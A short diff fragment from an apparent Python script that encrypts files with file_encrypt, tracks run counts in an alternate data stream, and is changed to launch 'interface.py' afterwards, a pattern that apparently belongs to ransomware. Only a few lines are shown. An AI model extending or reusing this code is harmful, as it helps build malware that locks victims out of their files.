@@ -200,7 +200,7 @@ if executions != 2:
 
     file_encrypt(files, key)
 time.sleep(5)
-#subprocess.run(["python3", "interface.py"])
+subprocess.run(["python3", "interface.py"])
 
 executions = read_executions_from_ads(file_path_ads)
         if executions != 2:
